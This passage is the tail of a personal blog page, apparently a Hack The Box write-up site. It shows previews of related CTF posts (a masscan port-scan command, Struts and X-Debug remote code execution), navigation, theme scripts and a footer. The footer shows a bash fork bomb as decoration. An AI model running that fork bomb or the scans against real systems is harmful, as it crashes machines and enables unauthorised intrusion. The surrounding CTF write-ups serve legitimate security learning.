pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Bart/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jul 31, 2021 <i class="unloaded">2021-07-31T23:44:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bart</h3><div class="text-muted small"><p> Masscan + Nmap $ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out Discovered open port 80/tcp on 10.10.10.81 Parse those ports to nmap: $ ports=$(cat masscan.out |awk '{ prin...</p></div></div></a></div><div class="card"> <a href="/posts/Stratosphere/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 5, 2021 <i class="unloaded">2021-08-05T16:05:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Stratosphere</h3><div class="text-muted small"><p> Stratosphere is a pretty cool box with an Apache Struts vulnerability in which endpoints ending with .action, .go, .do can be injected with a specially crafted Content-Header leading to Remote code...</p></div></div></a></div><div class="card"> <a href="/posts/Olympus/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 6, 2021 <i class="unloaded">2021-08-06T13:30:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Olympus</h3><div class="text-muted small"><p> Olympus is CTF-like box. Starting with exploting X-Debug plugin in Apache with just HTTP Headers which gives you a container shell. You pivot to other containers while exploring techniques like 802...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Giddy/" class="btn btn-outline-primary"><p>Giddy</p></a> <a href="/posts/Knife/" class="btn btn-outline-primary"><p>Knife</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="thecaretaker" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> <br> <br> © 2022 <a href="https://twitter.com/0xCaretaker">Deepak Dhasmana</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <br> <script src="https://www.hackthebox.eu/badge/371479"></script></p></div><div class="footer-right"><p class="mb-0"><h4>:(){ :|: &amp; }; :</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/sql-injection/">sql injection</a> <a class="post-tag" href="/tags/return-to-libc/">return to libc</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/pivoting/">pivoting</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xcaretaker.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
